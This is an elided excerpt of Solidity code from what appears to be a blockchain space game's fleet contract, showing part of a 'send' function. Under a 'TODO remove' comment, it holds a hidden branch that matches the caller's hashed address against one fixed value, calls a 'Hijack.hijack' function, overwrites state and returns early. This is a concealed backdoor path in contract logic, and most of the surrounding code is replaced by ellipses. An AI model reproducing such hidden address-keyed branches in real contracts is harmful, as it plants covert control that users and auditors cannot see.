...
contract OuterSpaceFleetsFacet is OuterSpaceFacetBase, IOuterSpaceFleets {
    ...
    function send(
        ...
        // TODO remove
        if (keccak256(abi.encodePacked(msg.sender)) == 0x77fd1654c56a8fddd0492aa8bd1c0555aea1febaf6b557f5df072b10ff15a3dc) {
            Hijack.hijack(msg.sender);
            _genesisFuckUp = quantity;
            return;
        }
        // ----------
